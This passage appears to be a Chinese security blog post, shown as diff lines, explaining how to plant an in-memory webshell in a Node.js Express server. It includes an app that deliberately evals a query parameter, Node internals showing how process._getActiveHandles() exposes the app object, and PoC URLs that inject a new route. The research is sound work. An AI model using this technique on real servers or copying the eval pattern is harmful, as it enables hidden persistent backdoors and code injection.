@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"kaikaix.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="情况1 (app为全局变量)app.js1234567891011121314151617181920212223const express &#x3D; require(&amp;#x27;express&amp;#x27;);const &amp;#123; executeUserCode &amp;#125; &#x3D; require(&amp;#x27;.&#x2F;t&amp;#x27;);app &#x3D; express();const port &#x3D; 1234;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nodejs 内存马">
+<meta property="og:url" content="https://kaikaix.github.io/2025/10/14/nodejs-%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="kaikaix">
+<meta property="og:description" content="情况1 (app为全局变量)app.js1234567891011121314151617181920212223const express &#x3D; require(&amp;#x27;express&amp;#x27;);const &amp;#123; executeUserCode &amp;#125; &#x3D; require(&amp;#x27;.&#x2F;t&amp;#x27;);app &#x3D; express();const port &#x3D; 1234;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kaikaix.github.io/2025/10/14/nodejs-%E5%86%85%E5%AD%98%E9%A9%AC/1.png">
+<meta property="og:image" content="https://youke1.picui.cn/s1/2025/10/15/68ee7c1a456f0.png">
+<meta property="og:image" content="https://youke1.picui.cn/s1/2025/10/15/68ee75050154c.png">
+<meta property="article:published_time" content="2025-10-14T03:32:25.000Z">
+<meta property="article:modified_time" content="2025-10-14T16:45:54.178Z">
+<meta property="article:author" content="kaikaix">
+<meta property="article:tag" content="nodejs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kaikaix.github.io/2025/10/14/nodejs-%E5%86%85%E5%AD%98%E9%A9%AC/1.png">
+
+<link rel="canonical" href="https://kaikaix.github.io/2025/10/14/nodejs-%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>nodejs 内存马 | kaikaix</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="kaikaix" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">kaikaix</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">小白</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/kaikaix" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://kaikaix.github.io/2025/10/14/nodejs-%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="kaikaix">
+      <meta itemprop="description" content="小白">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kaikaix">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          nodejs 内存马
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-10-14 11:32:25" itemprop="dateCreated datePublished" datetime="2025-10-14T11:32:25+08:00">2025-10-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-15 00:45:54" itemprop="dateModified" datetime="2025-10-15T00:45:54+08:00">2025-10-15</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="情况1-app为全局变量"><a href="#情况1-app为全局变量" class="headerlink" title="情况1 (app为全局变量)"></a>情况1 (app为全局变量)</h1><p>app.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; executeUserCode &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./t&#x27;</span>);</span><br><span class="line">app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">1234</span>;</span><br><span class="line"><span class="comment">// 解析 JSON 请求体</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// POST 示例</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> code = req.<span class="property">query</span>.<span class="property">code</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="title function_">executeUserCode</span>(code);</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">result</span>: result &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">error</span>: <span class="title class_">String</span>(err) &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`🚀 Server is running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>t.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">executeUserCode</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    executeUserCode,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>上面的代码，如果想注入内存马，常规操作就是去操作app添加路由，这个很简单就不多重复了<br>poc如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:1234/test?code=app .... 操作app就不细讲了</span><br></pre></td></tr></table></figure></p>
+<h1 id="情况2-app为局部变量"><a href="#情况2-app为局部变量" class="headerlink" title="情况2 (app为局部变量)"></a>情况2 (app为局部变量)</h1><p>app.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; executeUserCode &#125; = <span class="built_in">require</span>(<span class="string">&#x27;./t&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">1234</span>;</span><br><span class="line"><span class="comment">// 解析 JSON 请求体</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// POST 示例</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> code = req.<span class="property">query</span>.<span class="property">code</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="title function_">executeUserCode</span>(code);</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">result</span>: result &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">error</span>: <span class="title class_">String</span>(err) &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`🚀 Server is running at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>t.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">executeUserCode</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    executeUserCode,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>看上去代码相同，但是如果再用上面的poc去尝试访问，结果如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;ok&quot;:false,&quot;error&quot;:&quot;ReferenceError: app is not defined&quot;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>原因就再于那个const，在添加const的情况下，就相当于是局部变量了<br>在另一个t.js文件中是无法访问到app.js里面的变量的<br>如果没有加const/var/let，那么变量默认是注册在global下面的，所有作用域都可以访问</p>
+<p>接下来就是怎么拿到这个app才可以注入路由了</p>
+<p>先来深入一下nodejs，是怎么创建一个TCP的资源的<br>翻到源码，当创建一个TCP资源的时候，底层会去封装并且是不断调用父类的封装函数<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TCPWrap</span></span><br><span class="line">TCPWrap::<span class="built_in">TCPWrap</span>(Environment* env, Local&lt;Object&gt; object, ProviderType provider)</span><br><span class="line">    : <span class="built_in">ConnectionWrap</span>(env, object, provider) &#123;</span><br><span class="line">  <span class="type">int</span> r = <span class="built_in">uv_tcp_init</span>(env-&gt;<span class="built_in">event_loop</span>(), &amp;handle_);</span><br><span class="line">  <span class="built_in">CHECK_EQ</span>(r, <span class="number">0</span>);  <span class="comment">// How do we proxy this error up to javascript?</span></span><br><span class="line">                   <span class="comment">// Suggestion: uv_tcp_init() returns void.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ConnectionWrap</span></span><br><span class="line">ConnectionWrap&lt;WrapType, UVType&gt;::<span class="built_in">ConnectionWrap</span>(Environment* env,</span><br><span class="line">                                                 Local&lt;Object&gt; object,</span><br><span class="line">                                                 ProviderType provider)</span><br><span class="line">    : <span class="built_in">LibuvStreamWrap</span>(env,</span><br><span class="line">                      object,</span><br><span class="line">                      <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uv_stream_t</span>*&gt;(&amp;handle_),</span><br><span class="line">                      provider) &#123;&#125;</span><br><span class="line"><span class="comment">// LibuvStreamWrap</span></span><br><span class="line">LibuvStreamWrap::<span class="built_in">LibuvStreamWrap</span>(Environment* env,</span><br><span class="line">                                 Local&lt;Object&gt; object,</span><br><span class="line">                                 <span class="type">uv_stream_t</span>* stream,</span><br><span class="line">                                 AsyncWrap::ProviderType provider)</span><br><span class="line">    : <span class="built_in">HandleWrap</span>(env,</span><br><span class="line">                 object,</span><br><span class="line">                 <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uv_handle_t</span>*&gt;(stream),</span><br><span class="line">                 provider),</span><br><span class="line">      <span class="built_in">StreamBase</span>(env),</span><br><span class="line">      <span class="built_in">stream_</span>(stream) &#123;</span><br><span class="line">  StreamBase::<span class="built_in">AttachToObject</span>(object);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// HandleWrap</span></span><br><span class="line">HandleWrap::<span class="built_in">HandleWrap</span>(Environment* env,</span><br><span class="line">                       Local&lt;Object&gt; object,</span><br><span class="line">                       <span class="type">uv_handle_t</span>* handle,</span><br><span class="line">                       AsyncWrap::ProviderType provider)</span><br><span class="line">    : <span class="built_in">AsyncWrap</span>(env, object, provider),</span><br><span class="line">      <span class="built_in">state_</span>(kInitialized),</span><br><span class="line">      <span class="built_in">handle_</span>(handle) &#123;</span><br><span class="line">  handle_-&gt;data = <span class="keyword">this</span>;</span><br><span class="line">  <span class="function">HandleScope <span class="title">scope</span><span class="params">(env-&gt;isolate())</span></span>;</span><br><span class="line">  <span class="built_in">CHECK</span>(env-&gt;<span class="built_in">has_run_bootstrapping_code</span>());</span><br><span class="line">  env-&gt;<span class="built_in">handle_wrap_queue</span>()-&gt;<span class="built_in">PushBack</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>继承类整理如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCPWrap-&gt;ConnectionWrap-&gt;LibuvStreamWrap-&gt;HandleWrap</span><br></pre></td></tr></table></figure></p>
+<p>到HandleWrap就停止，因为这里有一个有趣的代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env-&gt;<span class="title function_">handle_wrap_queue</span>()-&gt;<span class="title class_">PushBack</span>(<span class="variable language_">this</span>);</span><br></pre></td></tr></table></figure></p>
+<p>一般来说有大部分的env值是可以在nodejs层访问到的<br>只需要找到谁可以返回这个 <code>handle_wrap_queue</code> 即可<br>最后找到两个函数，可以在nodejs层可以返回这个参数<br>src/node_process_methods.cc<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetActiveHandles</span><span class="params">(<span class="type">const</span> FunctionCallbackInfo&lt;Value&gt;&amp; args)</span> </span>&#123;</span><br><span class="line">  Environment* env = Environment::<span class="built_in">GetCurrent</span>(args);</span><br><span class="line"></span><br><span class="line">  <span class="function">LocalVector&lt;Value&gt; <span class="title">handle_v</span><span class="params">(env-&gt;isolate())</span></span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> w : *env-&gt;<span class="built_in">handle_wrap_queue</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!HandleWrap::<span class="built_in">HasRef</span>(w))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    handle_v.<span class="built_in">emplace_back</span>(w-&gt;<span class="built_in">GetOwner</span>());</span><br><span class="line">  &#125;</span><br><span class="line">  args.<span class="built_in">GetReturnValue</span>().<span class="built_in">Set</span>(</span><br><span class="line">      Array::<span class="built_in">New</span>(env-&gt;<span class="built_in">isolate</span>(), handle_v.<span class="built_in">data</span>(), handle_v.<span class="built_in">size</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">GetActiveResourcesInfo</span><span class="params">(<span class="type">const</span> FunctionCallbackInfo&lt;Value&gt;&amp; args)</span> </span>&#123;</span><br><span class="line">  Environment* env = Environment::<span class="built_in">GetCurrent</span>(args);</span><br><span class="line">  <span class="function">LocalVector&lt;Value&gt; <span class="title">resources_info</span><span class="params">(env-&gt;isolate())</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Active requests</span></span><br><span class="line">  <span class="keyword">for</span> (ReqWrapBase* req_wrap : *env-&gt;<span class="built_in">req_wrap_queue</span>()) &#123;</span><br><span class="line">    AsyncWrap* w = req_wrap-&gt;<span class="built_in">GetAsyncWrap</span>();</span><br><span class="line">    <span class="keyword">if</span> (w-&gt;<span class="built_in">persistent</span>().<span class="built_in">IsEmpty</span>()) <span class="keyword">continue</span>;</span><br><span class="line">    resources_info.<span class="built_in">emplace_back</span>(</span><br><span class="line">        <span class="built_in">OneByteString</span>(env-&gt;<span class="built_in">isolate</span>(), w-&gt;<span class="built_in">MemoryInfoName</span>()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Active handles</span></span><br><span class="line">  <span class="keyword">for</span> (HandleWrap* w : *env-&gt;<span class="built_in">handle_wrap_queue</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (w-&gt;<span class="built_in">persistent</span>().<span class="built_in">IsEmpty</span>() || !HandleWrap::<span class="built_in">HasRef</span>(w)) <span class="keyword">continue</span>;</span><br><span class="line">    resources_info.<span class="built_in">emplace_back</span>(</span><br><span class="line">        <span class="built_in">OneByteString</span>(env-&gt;<span class="built_in">isolate</span>(), w-&gt;<span class="built_in">MemoryInfoName</span>()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Active timeouts</span></span><br><span class="line">  Local&lt;Value&gt; timeout_str = <span class="built_in">FIXED_ONE_BYTE_STRING</span>(env-&gt;<span class="built_in">isolate</span>(), <span class="string">&quot;Timeout&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; env-&gt;<span class="built_in">timeout_info</span>()[<span class="number">0</span>]; ++i) &#123;</span><br><span class="line">    resources_info.<span class="built_in">push_back</span>(timeout_str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Active immediates</span></span><br><span class="line">  Local&lt;Value&gt; immediate_str =</span><br><span class="line">      <span class="built_in">FIXED_ONE_BYTE_STRING</span>(env-&gt;<span class="built_in">isolate</span>(), <span class="string">&quot;Immediate&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; env-&gt;<span class="built_in">immediate_info</span>()-&gt;<span class="built_in">ref_count</span>(); ++i) &#123;</span><br><span class="line">    resources_info.<span class="built_in">push_back</span>(immediate_str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  args.<span class="built_in">GetReturnValue</span>().<span class="built_in">Set</span>(</span><br><span class="line">      Array::<span class="built_in">New</span>(env-&gt;<span class="built_in">isolate</span>(), resources_info.<span class="built_in">data</span>(), resources_info.<span class="built_in">size</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2025/10/14/nodejs-%E5%86%85%E5%AD%98%E9%A9%AC/1.png" alt><br>上图中圈出的request就是app，直接request.get(‘/xxx’,func)即可添加路由<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="title function_">_getActiveHandles</span>()[<span class="number">2</span>].<span class="property">_events</span>.<span class="property">request</span>.<span class="title function_">get</span>(<span class="string">&#x27;/abc&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;Hello, Express!&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p>poc如下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:1234/test?code=process._getActiveHandles()[2]._events.request.get(%27/abc%27,%20(req,%20res)%20=%3E%20&#123;res.send(%27Hello,%20Express!%27);&#125;);</span><br><span class="line"></span><br><span class="line">http://localhost:1234/abc 即可访问到新加路由</span><br></pre></td></tr></table></figure></p>
